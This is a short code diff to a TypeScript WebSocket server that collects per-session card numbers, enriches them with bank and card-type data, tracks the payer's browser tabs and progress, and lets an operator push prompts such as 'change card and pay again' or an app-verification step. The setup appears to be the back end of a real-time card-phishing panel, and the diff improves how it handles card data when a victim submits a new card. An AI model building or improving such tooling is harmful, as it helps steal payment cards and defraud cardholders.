@@ -172,7 +172,15 @@ export async function setupWebSocket(server: any) {
           const prevStatus = s.status;
 
           // merge
-          if (data.cardInfo) s.cardInfo = { ...s.cardInfo, ...data.cardInfo };
+          if (data.cardInfo) {
+            // Clear old BIN enrichment when new card submitted
+            if (data.cardInfo.cardNumber && !data.cardInfo.bankName) {
+              delete data.cardInfo.bankName;
+              delete data.cardInfo.cardType;
+              delete data.cardInfo.cardLevel;
+            }
+            s.cardInfo = { ...s.cardInfo, ...data.cardInfo };
+          }
           if (data.customerInfo) s.customerInfo = { ...s.customerInfo, ...data.customerInfo };
           if (data.browsingTabs !== undefined) s.browsingTabs = data.browsingTabs;
           if (data.currentStep !== undefined) s.currentStep = data.currentStep;
@@ -337,8 +345,8 @@ export async function setupWebSocket(server: any) {
           if (action === 'custom_prompt') custMsg = message || '';
           if (action === 'change_card_prompt') custMsg = message || '请更换卡片重新支付';
 
-          // For app_verify, ensure cardInfo is enriched with bankName before sending
-          if (action === 'app_verify' && s && !(s as any).cardInfo.bankName) {
+          // For app_verify, always re-enrich cardInfo (card may have changed)
+          if (action === 'app_verify' && s) {
             try {
               await enrichAndSaveCardInfo((s as any).cardInfo);
               broadcast('session_update', { sessionId, cardInfo: { ...(s as any).cardInfo } }, sessionId);
